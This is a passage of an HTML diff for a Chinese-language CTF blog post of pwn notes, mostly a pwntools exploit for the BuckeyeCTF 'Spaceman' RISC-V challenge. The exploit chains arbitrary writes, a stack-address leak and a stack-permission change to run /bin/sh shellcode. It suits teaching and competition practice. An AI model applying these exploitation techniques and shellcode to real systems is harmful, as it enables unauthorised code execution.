+</span></span></span><span class="line"><span class="cl"><span class="s2">    gdb-multiarch</span><span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="s2">    -ex &#34;file </span><span class="si">{0}</span><span class="s2">&#34;</span><span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="s2">    -ex &#34;targe remote :</span><span class="si">{1}</span><span class="s2">&#34;</span><span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="s2">    -ex &#34;setarchitecture </span><span class="si">{2}</span><span class="s2">&#34;</span><span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="s2">    &#34;&#34;&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="s1">&#39;./1&#39;</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="s2">&#34;arm&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># -ex &#34;add-symbol-file {libc_file_path} {addr}&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pwnlib</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">misc</span><span class="o">.</span><span class="n">run_in_new_terminal</span><span class="p">(</span><span class="n">attach_payload</span><span class="p">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>异构静态编译的情况下可以通过arena_get_retry和dl_runtime_reslove来控制参数</p>
+<p>aarch64</p>
+<p>riscv64:</p>
+<p>is_trusted_path_normalize 函数这里可以控制sp进行栈迁移</p>
+</li>
+<li>
+<p>dil 是rdi寄存器的低32位</p>
+<p><a href="https://www.jianshu.com/p/57128e477efb"target="_blank" rel="external nofollow noopener noreferrer">https://www.jianshu.com/p/57128e477efb<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+</li>
+<li>
+<p>在libc段存在elf 地址，比如stdout</p>
+</li>
+<li>
+<p>设置返回地址位libc_start_main_impl+139 程序会重新从main函数开始</p>
+</li>
+<li>
+<p><code>set context-sections</code> 命令用于配置在打印当前堆栈帧时显示的上下文信息部分。它定义了在上下文输出中显示哪些信息。</p>
+<p>该命令接受一个字符串参数，用于指定要包含在上下文显示中的部分。可用的部分包括：</p>
+<ul>
+<li><code>all</code>：包括所有可用的部分。</li>
+<li><code>registers</code>：显示寄存器的值。</li>
+<li><code>code</code>：显示反汇编的代码。</li>
+<li><code>stack</code>：显示堆栈内存。</li>
+<li><code>data</code>：显示数据内存。</li>
+</ul>
+</li>
+<li>
+<p>gs，fs寄存器可以让我们找到程序的地址</p>
+</li>
+<li>
+<p><code>%*</code>的利用</p>
+<p>[19:41]You can leak value on the stack using %*
+[19:41]Although u cant specify the index
+[19:41]U can use %c %c %* to get a leak on any position</p>
+</li>
+<li>
+<p>_nptl_change_stack_perm 可用于设置栈的权限，目前在risc-v题的题目中见过</p>
+</li>
+</ul>
+<p>BuckeyeCTF Spaceman</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./spaceman&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># io = process(&#34;./run.sh&#34;)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># io = remote(&#34;127.0.0.1&#34;,1337)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;challs.pwnoh.io&#34;</span><span class="p">,</span> <span class="mi">13372</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">sc</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x2e</span>
+</span></span><span class="line"><span class="cl"><span class="n">sc</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x93\x08\xf0\x03\x13\x05\x00\x00\x93\x05\x81\xec\x13\x06\x00\x10</span><span class="s2">s</span><span class="se">\x00\x00\x00</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># sc = b&#34;A&#34;*8</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># sc += b&#34;B&#34;*8</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># sc += b&#34;C&#34;*8</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># sc += b&#34;D&#34;*8</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;LOGIN: &#39;</span><span class="p">,</span><span class="n">sc</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">environ</span> <span class="o">=</span> <span class="mh">0x8f6a0</span>
+</span></span><span class="line"><span class="cl"><span class="n">_read</span> <span class="o">=</span> <span class="mh">0x2474e</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># arb write (write help function over echo 0x89028)</span>
+</span></span><span class="line"><span class="cl"><span class="n">address</span> <span class="o">=</span> <span class="mh">0x89008</span><span class="c1">#0x8a990</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;gang</span><span class="se">\x00</span><span class="s2">aaa&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">8</span><span class="c1">#p64(0x89028)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># p = p.ljust(0x10,b&#34;A&#34;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">address</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># p += b&#34;C&#34;*7</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">_read</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;COMMAND&gt; &#34;</span><span class="p">,</span><span class="n">p</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># sleep(1)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p2</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x89028</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x89028</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;COMMAND&gt; &#34;</span><span class="p">,</span> <span class="n">p2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xae\x07\x01</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># leak environ</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;gang</span><span class="se">\x00</span><span class="s2">aaa&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># p += b&#34;A&#34;*8#p64(0x89028)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">environ</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># p += b&#34;C&#34;*7</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># p += p64(_read)[:-1]</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;COMMAND&gt; &#34;</span><span class="p">,</span><span class="n">p</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;COMMAND&gt; &#34;</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;echo&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;COMMANDS:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">environ</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">(</span><span class="kc">False</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;environ&#34;</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">environ</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">sc_addr</span> <span class="o">=</span> <span class="n">environ</span><span class="o">-</span><span class="mi">552</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret_addr</span> <span class="o">=</span> <span class="n">environ</span><span class="o">-</span><span class="mi">144</span><span class="o">-</span><span class="mi">96</span>
+</span></span><span class="line"><span class="cl"><span class="n">pthread</span> <span class="o">=</span> <span class="mh">0x8a480</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># reset sys_run</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;gang</span><span class="se">\x00</span><span class="s2">aaa&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">8</span><span class="c1">#p64(0x89028)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># p = p.ljust(0x10,b&#34;A&#34;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x5aa90</span><span class="p">)</span> <span class="c1">#help</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># p += b&#34;C&#34;*7</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x10854</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="c1">#sys_run</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;COMMAND&gt; &#34;</span><span class="p">,</span><span class="n">p</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;COMMAND&gt; &#34;</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;help&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sc</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x8aa00</span><span class="p">)</span> <span class="c1"># junk writable addr</span>
+</span></span><span class="line"><span class="cl"><span class="n">sc</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;B&#34;</span><span class="o">*</span><span class="mi">8</span>
+</span></span><span class="line"><span class="cl"><span class="n">sc</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4ef00</span><span class="p">)</span><span class="c1"># make stack executable __nptl_change_stack_perm</span>
+</span></span><span class="line"><span class="cl"><span class="n">sc</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x8a480</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;LOGIN: &#39;</span><span class="p">,</span><span class="n">sc</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># arb write (overwrite ret addr for gad1)</span>
+</span></span><span class="line"><span class="cl"><span class="n">address</span> <span class="o">=</span> <span class="mh">0x89008</span><span class="c1">#0x8a990</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;gang</span><span class="se">\x00</span><span class="s2">aaa&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">8</span><span class="c1">#p64(0x89028)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># p = p.ljust(0x10,b&#34;A&#34;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">address</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># p += b&#34;C&#34;*7</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">_read</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;COMMAND&gt; &#34;</span><span class="p">,</span><span class="n">p</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p2</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;COMMAND&gt; &#34;</span><span class="p">,</span> <span class="n">p2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">sc_addr</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># sc_addr = 0x0040007ffc70</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># p = b&#34;gang\x00aaa&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># # p += b&#34;A&#34;*8#p64(0x89028)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># p = p.ljust(0x10,b&#34;A&#34;)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># p += p64(sc_addr)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># # p += b&#34;C&#34;*7</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># # p += p64(_read)[:-1]</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># io.sendlineafter(b&#34;COMMAND&gt; &#34;,p)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># sleep(1)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># context.log_level = &#39;debug&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># call gad1</span>
+</span></span><span class="line"><span class="cl"><span class="n">gad_1</span> <span class="o">=</span> <span class="mh">0x443b8</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;gang</span><span class="se">\x00</span><span class="s2">aaa&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">8</span><span class="c1">#p64(0x89028)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># p = p.ljust(0x10,b&#34;A&#34;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x5aa90</span><span class="p">)</span> <span class="c1">#help</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># p += b&#34;C&#34;*7</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">gad_1</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;COMMAND&gt; &#34;</span><span class="p">,</span><span class="n">p</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;dish&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">addr</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&#34;f&#34;</span><span class="p">,</span><span class="n">p32</span><span class="p">(</span><span class="n">sc_addr</span><span class="o">&amp;</span><span class="mh">0xfffff000</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;ENTER COORDINATES: &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;0 &#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;engines&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">addr_top</span> <span class="o">=</span> <span class="p">(</span><span class="n">sc_addr</span><span class="o">&amp;</span><span class="mh">0xffffffff00000000</span><span class="p">)</span><span class="o">&gt;&gt;</span><span class="mi">2</span><span class="o">**</span><span class="mi">5</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;ENTER POWER (0-10): &#34;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">addr_top</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;help&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">full_shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">full_shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x13\x00\x00\x00\x13\x00\x00\x00\x13\x00\x00\x00\x13\x00\x00\x00\x13\x00\x00\x00\x13\x00\x00\x00\x13\x00\x00\x00\x13\x00\x00\x00\x13\x00\x00\x00\x13\x00\x00\x00\x17\x05\x00\x00\x13\x85\x05\x00\x93\x05\x00\x00\x13\x06\x00\x00\x93\x08\xd0\r</span><span class="s2">s</span><span class="se">\x00\x00\x00</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">full_shellcode</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
+</div>
+</div></div><div class="collection-card">
+      <div class="collection-title text-secondary">收录于 <a href="/collections/pwn/"><i class="fa-solid fa-layer-group fa-fw" aria-hidden="true"></i> <span>合集・Pwn</span></span></a> 3</div>
+      <div class="collection-nav">
+        <a href="/posts/stack-challenge/" class="collection-nav-item" rel="prev" title="Stack Challenge"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i><span>Stack Challenge</span>
+          </a></div>
+    </div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="更新于 2025-01-04 23:41:43">更新于 2025-01-04&nbsp;</span>
+      </div><div class="post-info-license">
+            <span><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span>
+          </div></div><div class="post-info-line">
+        <div class="post-info-md"><span><a href="/posts/pwn%E6%9D%82%E8%AE%B0/index.md" title="阅读原始文档" class="link-to-markdown">阅读原始文档</a></span></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="分享到 X" data-sharer="twitter" data-url="https://chuw3i.github.io/posts/pwn%E6%9D%82%E8%AE%B0/" data-title="PWN杂记" data-hashtags="杂记"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://chuw3i.github.io/posts/pwn%E6%9D%82%E8%AE%B0/" data-hashtag="杂记"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://chuw3i.github.io/posts/pwn%E6%9D%82%E8%AE%B0/" data-title="PWN杂记"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E6%9D%82%E8%AE%B0/" class="post-tag" title="标签 - 杂记">杂记</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/posts/2023-12%E6%9C%88%E6%AF%94%E8%B5%9Bwp%E5%A4%8D%E7%8E%B0/" class="post-nav-item" rel="prev" title="2023 12月比赛wp复现"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>2023 12月比赛wp复现</a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="目录"></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.147.0"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.21-a85a6655"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">chuwei</a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="preload" href="/lib/katex/katex.min.7fcad90fec5779332198a785f8ffb5af9cdf8d41a6fac42ff420bbb526d9c01b.css" integrity="sha256-f8rZD+xXeTMhmKeF+P+1r5zfjUGm+sQv9CC7tSbZwBs=" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
